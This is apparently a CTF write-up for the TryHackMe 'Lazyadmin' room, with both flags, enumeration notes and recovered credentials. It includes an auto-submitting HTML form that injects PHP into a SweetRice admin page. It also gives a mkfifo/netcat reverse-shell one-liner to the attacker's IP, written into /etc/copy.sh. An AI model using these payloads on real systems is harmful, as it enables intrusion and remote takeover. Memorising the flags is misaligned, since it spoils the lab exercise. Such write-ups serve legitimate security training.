---
title: "Lazyadmin"

author: Matt Hammond
date: 2022-12-21
url: /lazyadmin/
image: images/2022-thumbs/lazyadmin.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions

1. What is the user flag? `THM{63e5bce9271952aad1113b6f1ac28a07}`
2. What is the root flag? `THM{6637f41d0177b6f37cb20d775124699f}`

---

## Notes

- MyIP = 10.18.53.113
- IP = 10.10.165.206

- enumerated website with gobuster
  - found /content = enumerated
  - found sweetrice

### sweetrice

- exploited and found backup sql database
- admin account

```html
<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>
```

- name: manager
  -password: 42f749ade7f9e195bf475f37a44cafcb - hashid: md5 - password is= Password123

- change main.php template to reverse shell

### Exposed Services

```bash
22
80
```

### Users:Passwords

- manager:Password123
- rice:randompass (found from mysql_login.txt in /home/itguy)

### Vulnerabilities

- ***

## Commands

`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.53.113 4445 >/tmp/f" > /etc/copy.sh`
